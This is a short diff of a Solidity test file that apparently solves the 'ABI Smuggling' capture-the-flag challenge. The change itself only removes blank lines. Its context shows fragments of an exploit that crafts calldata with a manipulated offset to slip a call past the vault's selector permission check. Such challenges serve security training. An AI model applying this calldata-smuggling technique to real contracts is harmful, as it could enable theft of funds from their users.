@@ -73,7 +73,6 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
         bytes4 executeSelector = vault.execute.selector;
         bytes memory target = abi.encodePacked(bytes12(0), address(vault));
         bytes memory dataOffset = abi.encodePacked(uint256(0x80));
@@ -104,7 +103,6 @@ contract ABISmugglingChallenge is Test {
         );
 
         address(vault).call(calldataPayload);
-
     }
 
     /**
